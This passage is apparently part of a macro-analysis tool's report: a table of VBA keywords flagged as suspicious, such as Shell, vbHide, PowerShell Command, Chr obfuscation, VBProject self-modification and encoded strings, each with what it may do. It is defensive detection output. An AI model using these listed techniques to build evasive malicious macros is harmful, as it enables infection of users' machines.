|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

